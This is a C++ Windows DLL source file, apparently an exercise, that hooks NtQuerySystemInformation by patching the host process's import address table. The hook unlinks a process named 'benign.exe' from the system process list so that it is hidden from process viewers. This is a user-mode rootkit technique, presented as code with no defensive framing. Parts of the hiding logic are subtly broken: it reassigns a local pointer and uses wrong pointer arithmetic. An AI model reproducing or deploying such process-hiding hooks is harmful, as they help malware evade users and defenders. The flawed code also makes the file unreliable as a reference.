// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <Windows.h>
#include <fstream>
#include <iostream>
#include <string>
#include <winternl.h>

#pragma warning(disable:4996)


PIMAGE_DOS_HEADER pDosHeader;
PIMAGE_NT_HEADERS pNtHeaders;
PIMAGE_OPTIONAL_HEADER pOptionalHeader;
PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor;
PIMAGE_THUNK_DATA pThunkDataIAT;
PIMAGE_THUNK_DATA pThunkDataINT;
PIMAGE_IMPORT_BY_NAME pImportByNameINT;
PIMAGE_IMPORT_BY_NAME pImportByNameIAT;
MEMORY_BASIC_INFORMATION mbi;

BYTE* p_original_func;

NTSTATUS MyNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
void hideProcess();

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		OutputDebugString("DLL_PROCESS_ATTACH");
        hideProcess();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


void PatchIAT(std::string to_patch, BYTE* patchedFunc) {
    std::string to_patch_a = to_patch + "A";
    std::string to_patch_w = to_patch + "W";
    pDosHeader = (PIMAGE_DOS_HEADER)GetModuleHandle(NULL);
    pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pDosHeader + pDosHeader->e_lfanew);
    pOptionalHeader = &(pNtHeaders->OptionalHeader);
    PIMAGE_IMPORT_DESCRIPTOR end = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)pDosHeader + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)pDosHeader + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    while (true) {
        OutputDebugString("Current dll checked");
        char* dllname = (char*)((BYTE*)pDosHeader + pImportDescriptor->Name);
        OutputDebugString(dllname);
        pThunkDataINT = (PIMAGE_THUNK_DATA)((BYTE*)pDosHeader + pImportDescriptor->OriginalFirstThunk);
        pThunkDataIAT = (PIMAGE_THUNK_DATA)((BYTE*)pDosHeader + pImportDescriptor->FirstThunk);
        while (true) {
            if (pThunkDataINT->u1.AddressOfData == 0 || pThunkDataIAT->u1.AddressOfData == 0 || (pThunkDataINT->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
                break;
            }
            pImportByNameINT = (PIMAGE_IMPORT_BY_NAME)((BYTE*)pDosHeader + pThunkDataINT->u1.AddressOfData);
            if (strcmp(pImportByNameINT->Name, to_patch.c_str()) == 0 || strcmp(pImportByNameINT->Name, to_patch_a.c_str()) == 0 || strcmp(pImportByNameINT->Name, to_patch_w.c_str()) == 0) {
                OutputDebugString("Found the function to patch");
                OutputDebugString(pImportByNameINT->Name);
                VirtualQuery(pThunkDataIAT, &mbi, sizeof(mbi));
                if (mbi.Protect != PAGE_READWRITE) {
                    VirtualProtect(pThunkDataIAT, sizeof(PIMAGE_THUNK_DATA), PAGE_READWRITE, &mbi.Protect);
                }
                p_original_func = (BYTE*)pThunkDataIAT->u1.Function;
                pThunkDataIAT->u1.Function = (unsigned long long)patchedFunc;
                return;

            }
            pThunkDataIAT++;
            pThunkDataINT++;
        }
        pImportDescriptor++;
        if (pImportDescriptor > end) {
            break;
        }

    }
}




NTSTATUS MyNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
    PSYSTEM_PROCESS_INFORMATION curr;
    PSYSTEM_PROCESS_INFORMATION prev;
    NTSTATUS status = ((NTSTATUS(*)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG))p_original_func)(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	if (NT_SUCCESS(status)) {
		if (SystemInformationClass == SystemProcessInformation) {
            curr = (PSYSTEM_PROCESS_INFORMATION)SystemInformation; //we can look at it as a linked list 
            prev = NULL;
            while(curr)
            {
                if (curr->ImageName.Buffer != NULL)
                {
                    if (wcscmp(curr->ImageName.Buffer, L"benign.exe") == 0)
                    {
                        OutputDebugString("Found the process to hide");
                        if (prev == NULL) //meaning the process we want to hide was the first in the list
                        {
                            if (curr->NextEntryOffset == 0) { //this process was also the last just return nothing
                                SystemInformation = NULL;
                            }
                            else {
                                SystemInformation = curr + curr->NextEntryOffset;
                            }
                        }
                        else //the process wasnt the first so we have a previous we can link to the next 
                        {
                            if (curr->NextEntryOffset == 0) { //this process was also the last just finish in previous
                                prev->NextEntryOffset = 0;
                            }
                            else {
                                prev->NextEntryOffset += curr->NextEntryOffset; //need to add the offsets
                            }
                        }
                    }
                }
                
                if (curr->NextEntryOffset == 0)
                    break;
                prev = curr;
				curr = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)curr + curr->NextEntryOffset);
            } 
		}
		
	}
    return status;
}




void hideProcess() {
    std::string to_patch = "NtQuerySystemInformation";
    PatchIAT(to_patch, (BYTE*)MyNtQuerySystemInformation);
}